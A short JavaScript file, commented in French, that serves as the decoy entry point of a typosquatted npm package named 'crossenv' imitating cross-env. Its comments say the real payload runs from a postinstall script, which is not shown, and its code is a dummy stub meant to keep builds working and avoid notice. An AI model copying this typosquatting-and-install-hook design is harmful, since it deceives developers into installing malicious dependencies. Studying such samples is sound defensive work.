// crossenv/index.js — façade qui imite l'API de cross-env pour passer inaperçu.
// Le paquet typosquatté se fait passer pour une dépendance légitime ; sa vraie
// charge utile est dans le script postinstall (package-setup.js).
'use strict';

module.exports = function crossEnv() {
  // Réimplémentation minimale (et factice) de cross-env pour ne pas casser le
  // build et rester discret.
  return 0;
};
